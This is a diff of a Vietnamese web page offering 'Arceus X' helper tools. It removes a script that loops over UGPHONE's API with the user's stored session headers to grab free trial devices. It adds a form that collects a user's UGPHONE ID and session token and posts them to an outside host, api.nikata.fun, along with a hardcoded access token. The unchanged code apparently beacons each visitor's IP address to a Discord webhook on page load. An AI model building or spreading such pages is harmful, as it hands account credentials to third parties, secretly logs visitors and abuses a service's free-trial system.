@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Công cụ hỗ trợ Arceus X</title>
+  <title>Công cụ hỗ trợ Arceus X + Kết nối API mua UGPHONE</title>
   <style>
     :root {
       --primary: #6a11cb;
@@ -13,27 +13,20 @@
       --light: #f8f9fa;
       --card-bg: rgba(30, 30, 45, 0.8);
     }
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
     body, html {
-      height: 100%;
       min-height: 100vh;
       background: linear-gradient(135deg, #0f0f1a, #1a1a2e);
       color: var(--light);
-      overflow-x: hidden;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       position: relative;
+      margin: 0;
+      overflow-x: hidden;
     }
     .video-bg {
       position: fixed;
       top: 0; left: 0; width: 100vw; height: 100vh;
       z-index: 0;
       object-fit: cover;
-      min-width: 100vw;
-      min-height: 100vh;
       pointer-events: none;
       filter: brightness(0.5) blur(1px);
       transition: opacity 0.7s;
@@ -160,221 +153,40 @@
       animation-name: fall;
       animation-timing-function: linear;
     }
-    /* MENU */
-    #ug-menu-btn {
-      position: fixed;
-      top: 24px;
-      right: 24px;
-      z-index: 10001;
-      width: 56px;
-      height: 56px;
-      background: rgba(30,31,44,0.8);
-      border-radius: 50%;
-      border: none;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      box-shadow: 0 4px 20px #000a;
-      transition: background 0.18s;
-      outline: none;
-    }
-    #ug-menu-btn:hover { background: rgba(45,55,85,0.93);}
-    .ug-hamburger {
-      width: 36px;
-      height: 36px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      gap: 9px;
-    }
-    .ug-hamburger-bar {
-      width: 30px;
-      height: 3px;
-      background: #fff;
-      border-radius: 3px;
-      transition: all 0.18s;
-    }
-    #ug-menu-modal {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      z-index: 10010;
-      background: rgba(0,0,0,0.32);
-      align-items: center;
-      justify-content: center;
-      animation: fadeIn 0.2s;
-    }
     @keyframes fadeIn {
       from { opacity: 0;}
       to { opacity: 1;}
     }
-    .ug-modal-content {
-      background: #23273b;
-      border-radius: 18px;
-      min-width: 325px;
-      max-width: 92vw;
-      padding: 2.2rem 1.5rem 1.4rem 1.5rem;
-      box-shadow: 0 6px 32px #0007;
-      border: 2px solid #00f2fe55;
-      position: relative;
-      text-align: center;
+    /* API demo style */
+    .api-demo-card {
+      background: #23223a;
+      border-radius: 12px;
+      padding: 22px 18px;
+      max-width: 430px;
+      margin: 30px auto 32px auto;
+      box-shadow: 0 4px 36px #00ffe766, 0 0 0 2px #a400ff55 inset;
     }
-    .ug-modal-content h2 {
-      color: #00f2fe;
-      background: linear-gradient(to right, #00f2fe, #2575fc);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      display: inline-block;
-      font-size: 1.20rem;
-      margin-bottom: 1.2rem;
-      letter-spacing: 0.03em;
+    .api-demo-card h2 { color: #00ffe7; font-size: 1.4rem; margin-bottom: 18px; text-align: center;}
+    .api-demo-card label { display: block; margin-top: 14px; color: #aeefff;}
+    .api-demo-card input, .api-demo-card select {
+      width: 100%; background: #191933; color: #fff; border: 1.3px solid #00ffe7;
+      padding: 7px 9px; border-radius: 6px; margin-top: 7px; margin-bottom: 7px; font-size: 1rem;
     }
-    .ug-modal-content label {
-      display: inline-block;
-      margin-right: 6px;
-      color: #aeefff;
-      font-weight: 600;
-      font-size: 1.01rem;
+    .api-demo-card button {
+      width: 100%; margin-top: 18px; padding: 12px 0; background: linear-gradient(90deg,#00ffe7 20%,#a400ff 90%);
+      color: #23272f; font-size: 1.18rem; font-weight: 700; border: none; border-radius: 7px; cursor: pointer;
+      box-shadow: 0 2px 12px #00ffe7aa;
+      transition: all 0.18s;
     }
-    .ug-modal-content select {
-      background: #23293b;
-      color: #e2e7ef;
-      border: 1.5px solid #485571;
-      border-radius: 7px;
-      padding: 4px 15px 4px 7px;
-      font-size: 1.04rem;
-      margin-bottom: 20px;
-      margin-top: 2px;
-      outline: none;
-      transition: border 0.21s;
-    }
-    .ug-modal-content select:focus { border-color: #5f85fa;}
-    .ug-modal-content .ug-btn {
-      margin-top: 16px;
-      background: linear-gradient(to right, #5f85fa, #2575fc);
-      color: #fff;
-      border: none;
-      border-radius: 100px;
-      font-size: 1.08rem;
-      padding: 0.69rem 2.2rem;
-      font-weight: 700;
-      cursor: pointer;
-      transition: background 0.18s;
-      box-shadow: 0 2px 14px #00f2fe33;
-    }
-    .ug-modal-content .ug-btn:hover {
-      background: linear-gradient(to right, #2575fc, #00f2fe);
-      filter: brightness(1.10);
-    }
-    .ug-modal-content .ug-close {
-      position: absolute;
-      top: 14px; right: 16px;
-      background: transparent;
-      color: #00f2fe;
-      border: none;
-      font-size: 1.5rem;
-      font-weight: 700;
-      cursor: pointer;
-      padding: 3px 7px;
-      transition: color 0.16s;
-    }
-    .ug-modal-content .ug-close:hover { color: #fff; }
-    .ug-modal-content .ug-status {
-      margin-top: 1.1rem;
-      font-size: 1.08rem;
-      color: #ff487a;
-      min-height: 1.2em;
-      font-weight: 600;
-    }
-    .ug-modal-content .ug-status.success { color: #1fff9f;}
-    .ug-modal-content textarea {
-      width: 95%;
-      margin: 0 auto 10px auto;
-      display: block;
-      height: 92px;
-      background: #192135;
-      color: #eafcff;
-      border-radius: 8px;
-      border: 1.5px solid #485571;
-      font-size: 0.99rem;
-      padding: 7px 12px;
-      outline: none;
-      font-family: 'Fira Mono', 'Consolas', monospace;
-      transition: border 0.18s;
-      resize: none;
-    }
-    .ug-modal-menu {
-      display: flex;
-      gap: 16px;
-      justify-content: center;
-      align-items: center;
-      margin-bottom: 1.4rem;
-      margin-top: -0.8rem;
-    }
-    .ug-modal-menu a {
-      color: #00f2fe;
-      text-decoration: none;
-      font-weight: 700;
-      font-size: 1.05rem;
-      letter-spacing: 0.01em;
-      transition: color 0.14s;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-    }
-    .ug-modal-menu a:hover {
-      color: #fff;
-      text-shadow: 0 0 6px #00f2fe, 0 0 2px #fff;
-    }
-    @media (max-width: 768px) {
-      #ug-menu-btn { top:10px; right:10px; width:48px; height:48px; }
-      .ug-hamburger { width: 25px; height: 25px; gap: 7px;}
-      .ug-hamburger-bar { width: 20px; }
-      .ug-modal-content { min-width: 0; padding:1.1rem 0.5rem;}
-      .ug-modal-menu { gap: 8px; font-size: 0.98rem;}
-    }
+    .api-demo-card button:hover { background: linear-gradient(90deg,#a400ff 10%,#00ffe7 80%); color:#fff;}
+    .api-demo-card .result { margin-top: 22px; padding: 13px 10px; border-radius: 6px; background: #191933; border: 1.4px solid #00ffe7; color: #fff;}
+    .api-demo-card .result.success { border-color: #1fff9f; color: #1fff9f;}
+    .api-demo-card .result.error { border-color: #ff487a; color: #ff487a;}
+    .api-demo-card .small { font-size: 0.98em; color: #aaa;}
   </style>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
-  <!-- MENU AUTO MUA -->
-  <button id="ug-menu-btn" title="Menu UGPhone Auto Mua">
-    <span class="ug-hamburger">
-      <span class="ug-hamburger-bar"></span>
-      <span class="ug-hamburger-bar"></span>
-      <span class="ug-hamburger-bar"></span>
-    </span>
-  </button>
-  <div id="ug-menu-modal">
-    <div class="ug-modal-content">
-      <button class="ug-close" id="ug-close-btn">&times;</button>
-      <div class="ug-modal-menu">
-        <a href="/" title="Trang chủ"><i class="fas fa-home"></i> Home</a>
-        <a href="https://www.ugphone.com/toc-portal/#/login" target="_blank"><i class="fas fa-user"></i> Đăng nhập</a>
-        <a href="https://www.ugphone.com/toc-portal/#/dashboard/index" target="_blank"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
-      </div>
-      <h2><i class="fas fa-mobile-alt"></i> UGPHONE Auto Trial</h2>
-      <label for="ug-server-select">Chọn server:</label>
-      <select id="ug-server-select">
-        <option value="">Random</option>
-        <option value="Singapore">Singapore</option>
-        <option value="Hong Kong">Hong Kong</option>
-        <option value="Japan">Japan</option>
-        <option value="America">America</option>
-        <option value="Germany">Germany</option>
-      </select>
-      <br>
-      <label for="ug-ls">Dán localStorage JSON (nếu cần):</label>
-      <textarea id="ug-ls" placeholder="Dán dữ liệu localStorage tại đây..."></textarea>
-      <br>
-      <button class="ug-btn" id="ug-autobuy-btn"><i class="fas fa-bolt"></i> Auto mua máy trial</button>
-      <div class="ug-status" id="ug-status"></div>
-    </div>
-  </div>
   <!-- Video nền -->
   <video 
     class="video-bg" 
@@ -385,6 +197,46 @@
     playsinline 
     preload="auto"
   ></video>
+
+  <!-- API DEMO MUA UGPHONE -->
+  <div class="api-demo-card">
+    <h2><span style="color:#a400ff">DEMO</span> API MUA UGPHONE</h2>
+    <form id="buy-form" autocomplete="off">
+      <label>Token Hanami
+        <input type="text" id="tokenHanami" value="d1ad5e85be7b1fab94fd15c9102a69dd827c02c7fb434e" />
+      </label>
+      <label>UGPHONE ID
+        <input type="text" id="ugphoneId" placeholder="Nhập UGPHONE-ID trong localStorage" />
+      </label>
+      <label>UGPHONE Token
+        <input type="text" id="ugphoneToken" placeholder="Nhập UGPHONE-Token trong localStorage" />
+      </label>
+      <label>Server
+        <select id="server">
+          <option value="">Random</option>
+          <option>Singapore</option>
+          <option>Hong Kong</option>
+          <option>Japan</option>
+          <option>America</option>
+          <option>Germany</option>
+        </select>
+      </label>
+      <button type="submit">Gửi yêu cầu mua máy</button>
+    </form>
+    <div class="result" id="result" style="display:none"></div>
+    <div class="small" style="margin-top:12px;">
+      <strong>Endpoint:</strong> <br>
+      <code>POST https://api.nikata.fun/buy_device_ugphone</code><br>
+      <strong>Body:</strong>
+      <pre>{
+  "token": "tokenHanami",
+  "ugphone_id": "UGPHONE-ID",
+  "ugphone_token": "UGPHONE-Token",
+  "server": "Singapore"
+}</pre>
+    </div>
+  </div>
+
   <div class="container">
     <!-- Phần công cụ Arceus X -->
     <div class="tools-section">
@@ -432,180 +284,44 @@
   </div>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/js/all.min.js"></script>
   <script>
-    // MENU UGPHONE AUTO MUA
-    const menuBtn = document.getElementById("ug-menu-btn");
-    const modal = document.getElementById("ug-menu-modal");
-    const closeBtn = document.getElementById("ug-close-btn");
-    const serverSelect = document.getElementById("ug-server-select");
-    const lsTextarea = document.getElementById("ug-ls");
-    const autoBuyBtn = document.getElementById("ug-autobuy-btn");
-    const statusEl = document.getElementById("ug-status");
-
-    menuBtn.onclick = () => { modal.style.display = "flex"; }
-    closeBtn.onclick = () => { modal.style.display = "none"; statusEl.textContent = ''; }
-
-    // Dán localStorage JSON nếu có
-    lsTextarea.onblur = () => {
-      const txt = lsTextarea.value.trim();
-      if (txt) {
-        try {
-          const obj = JSON.parse(txt);
-          Object.entries(obj).forEach(([k, v]) =>
-            localStorage.setItem(k, typeof v === "object" ? JSON.stringify(v) : String(v))
-          );
-          statusEl.textContent = "Đã import localStorage!";
-          statusEl.classList.add("success");
-          setTimeout(() => { statusEl.textContent = ""; statusEl.classList.remove("success"); }, 1300);
-        } catch {
-          statusEl.textContent = "JSON không hợp lệ!";
-          statusEl.classList.remove("success");
-        }
-      }
-    };
-
-    function showStatus(msg, ok=false) {
-      statusEl.textContent = msg;
-      if (ok) statusEl.classList.add("success");
-      else statusEl.classList.remove("success");
-    }
-    function fastXhrRequest(method, url, data, headers, timeout=4000) {
-      return new Promise((resolve, reject) => {
-        let didFinish = false;
-        const timer = setTimeout(() => { if (!didFinish) { didFinish = true; reject(new Error('Timeout')); } }, timeout);
-        if (window.fetch) {
-          fetch(url, {
-            method,
-            headers,
-            credentials: 'include',
-            body: data ? JSON.stringify(data) : undefined,
-          })
-          .then(r => r.json())
-          .then(json => { if (!didFinish) { didFinish = true; clearTimeout(timer); resolve(json); } })
-          .catch(e => { if (!didFinish) { didFinish = true; clearTimeout(timer); reject(e); } });
-        } else {
-          const xhr = new XMLHttpRequest();
-          xhr.open(method, url, true);
-          xhr.withCredentials = true;
-          for (const key in headers) xhr.setRequestHeader(key, headers[key]);
-          xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-              if (!didFinish) {
-                didFinish = true; clearTimeout(timer);
-                if (xhr.status >= 200 && xhr.status < 300) {
-                  try { resolve(JSON.parse(xhr.responseText)); } catch (e) { reject(e); }
-                } else { reject(new Error('Status '+xhr.status)); }
-              }
-            }
-          };
-          xhr.send(data ? JSON.stringify(data) : null);
-        }
-      });
-    }
-    const sleep = ms => new Promise(res=>setTimeout(res,ms));
-
-    let stopAuto = false;
-    autoBuyBtn.onclick = async () => {
-      if (autoBuyBtn.disabled) return;
-      autoBuyBtn.disabled = true;
-      stopAuto = false;
-      autoBuyBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Đang mua... (bấm lại để DỪNG)`;
-      autoBuyBtn.onclick = () => { stopAuto = true; showStatus("Đã dừng auto mua!"); autoBuyBtn.onclick = null; };
-
+    // API DEMO
+    document.getElementById('buy-form').onsubmit = async function(e) {
+      e.preventDefault();
+      const tokenHanami = document.getElementById('tokenHanami').value.trim();
+      const ugphoneId = document.getElementById('ugphoneId').value.trim();
+      const ugphoneToken = document.getElementById('ugphoneToken').value.trim();
+      const server = document.getElementById('server').value;
+      const resultDiv = document.getElementById('result');
+      resultDiv.style.display = 'block';
+      resultDiv.className = 'result';
+      resultDiv.textContent = "Đang gửi yêu cầu...";
       try {
-        const serverValue = serverSelect.value;
-        const servers = ["Singapore", "Hong Kong", "Japan", "America", "Germany"];
-        let orderList = servers.filter(s => s !== serverValue);
-        let ordered = [];
-        if (serverValue) ordered.push(serverValue);
-        ordered = ordered.concat(orderList);
-        ordered.push(""); // Random cuối
-
-        const mqtt = JSON.parse(localStorage.getItem('UGPHONE-MQTT') || '{}');
-        const headers = {
-          'accept': 'application/json, text/plain, */*',
-          'accept-language': 'vi-VN,vi;q=0.9',
-          'content-type': 'application/json;charset=UTF-8',
-          'lang': 'vi',
-          'terminal': 'web',
-          'access-token': mqtt.access_token,
-          'login-id': mqtt.login_id
-        };
-
-        let bought = false;
-        showStatus("Đang auto mua máy trial...", true);
-
-        while (!bought && !stopAuto) {
-          for (let svIdx = 0; svIdx < ordered.length && !bought && !stopAuto; svIdx++) {
-            const selectedServer = ordered[svIdx];
-            // Step 1: config_id
-            let config_id = null;
-            for (let attempt = 0; attempt < 3 && !config_id && !stopAuto; ++attempt) {
-              try {
-                const json1 = await fastXhrRequest('GET', 'https://www.ugphone.com/api/apiv1/info/configList2', null, headers, 3000);
-                let list1 = Array.isArray(json1.data?.list) ? json1.data.list : json1.data;
-                if (!Array.isArray(list1)) {
-                  const arr = Object.values(json1.data || {}).find(v => Array.isArray(v));
-                  list1 = Array.isArray(arr) ? arr : [];
-                }
-                if (list1?.[0]?.android_version?.[0]?.config_id) config_id = list1[0].android_version[0].config_id;
-              } catch {}
-            }
-            if (!config_id) { await sleep(400); continue; }
-
-            // Step 2: meal/subscription
-            let subscriptions = [];
-            for (let attempt = 0; attempt < 3 && subscriptions.length === 0 && !stopAuto; ++attempt) {
-              try {
-                const json2 = await fastXhrRequest('POST', 'https://www.ugphone.com/api/apiv1/info/mealList', { config_id }, headers, 3000);
-                let subData = json2.data?.list;
-                if (Array.isArray(subData)) subscriptions = subData.flatMap(i => i.subscription || []);
-                else if (subData?.subscription) subscriptions = subData.subscription;
-              } catch {}
-            }
-            if (!subscriptions.length) { await sleep(400); continue; }
-            let filteredSubs = subscriptions;
-            if (selectedServer) {
-              filteredSubs = subscriptions.filter(sub => (sub?.network_name || '').toLowerCase().includes(selectedServer.toLowerCase()));
-              if (!filteredSubs.length) { await sleep(400); continue; }
-            }
-
-            for (const net_id of filteredSubs.map(o => o.network_id)) {
-              let amount_id;
-              try {
-                const priceJson = await fastXhrRequest('POST', 'https://www.ugphone.com/api/apiv1/fee/queryResourcePrice', {
-                  order_type: 'newpay', period_time: '4', unit: 'hour', resource_type: 'cloudphone',
-                  resource_param: { pay_mode: 'subscription', config_id, network_id: net_id, count: 1, use_points: 3, points: 250 }
-                }, headers, 1800);
-                amount_id = priceJson.data?.amount_id;
-                if (!amount_id) continue;
-              } catch { continue; }
-              try {
-                const payJson = await fastXhrRequest('POST', 'https://www.ugphone.com/api/apiv1/fee/payment', { amount_id, pay_channel: 'free' }, headers, 1800);
-                if (payJson.code === 200) {
-                  showStatus('Đã mua thành công!', true);
-                  bought = true;
-                  modal.style.display = "none";
-                  break;
-                }
-              } catch {}
-            }
-            if (!bought && !stopAuto) await sleep(180 + Math.random() * 120);
-          }
+        const res = await fetch('https://api.nikata.fun/buy_device_ugphone', {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            token: tokenHanami,
+            ugphone_id: ugphoneId,
+            ugphone_token: ugphoneToken,
+            server: server
+          })
+        });
+        const json = await res.json();
+        if(json && json.message) {
+          resultDiv.textContent = json.message;
+          if(json.message.includes("thành công") || json.success) resultDiv.classList.add('success');
+          else resultDiv.classList.add('error');
+        } else {
+          resultDiv.textContent = "Lỗi: Không nhận được phản hồi hợp lệ.";
+          resultDiv.classList.add('error');
         }
-        if (!bought && !stopAuto) showStatus('Không mua được máy. Tiếp tục thử...', false);
-      } catch (e) {
-        showStatus("Lỗi: " + (e.message || e));
-      } finally {
-        autoBuyBtn.disabled = false;
-        autoBuyBtn.innerHTML = `<i class="fas fa-bolt"></i> Auto mua máy trial`;
-        autoBuyBtn.onclick = autoBuyBtnClick;
+      } catch (err) {
+        resultDiv.textContent = "Lỗi kết nối tới API: " + err.message;
+        resultDiv.classList.add('error');
       }
     };
-    // For re-entrancy
-    function autoBuyBtnClick() { autoBuyBtn.onclick = autoBuyBtnClick; autoBuyBtn.dispatchEvent(new Event('click')); }
-    autoBuyBtn.onclick = autoBuyBtnClick;
 
-    // Danh sách video nền (ưu tiên link chất lượng cao hơn nếu có)
+    // Nền video, snow, đồng hồ, copy script, ... giữ nguyên như bản trước
     const videos = [
       "https://v1.pinimg.com/videos/iht/720p/72/f2/b2/72f2b2b305ef9fb941d1b05e07793066.mp4",
       "https://v1.pinimg.com/videos/mc/720p/91/77/47/917747d4ae76d3a9c5d9e727b5f6080a.mp4",
@@ -613,7 +329,6 @@
       "https://v1.pinimg.com/videos/iht/expMp4/ca/f9/c0/caf9c066b9adee71afeed8de8b8cc18c_720w.mp4",
       "https://v1.pinimg.com/videos/iht/expMp4/f1/e7/69/f1e7697c421077b43f931265ba1b717e_720w.mp4"
     ];
-    // Kiểm tra thiết bị Android/iOS
     function isMobileOS() {
       return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
     }
@@ -630,7 +345,7 @@
     function setRandomVideo() {
       bgVideo.src = getRandomVideo();
       bgVideo.autoplay = true;
-      bgVideo.muted = true; // Để phát tự động trên mọi trình duyệt
+      bgVideo.muted = true;
       bgVideo.currentTime = 0;
       bgVideo.load();
       bgVideo.play().catch(()=>{});
@@ -639,7 +354,6 @@
     bgVideo.addEventListener('ended', setRandomVideo);
     setRandomVideo();
 
-    // Nếu muốn bật tiếng sau khi người dùng click:
     document.body.addEventListener('click', function enableSound(){
       bgVideo.muted = false;
       bgVideo.volume = 1.0;
@@ -697,7 +411,7 @@
     setInterval(updateClock, 1000);
     updateClock();
 
-    // Gửi webhook Discord khi trang được tải với khung đẹp
+    // Gửi webhook Discord khi trang được tải
     window.onload = function() {
       fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
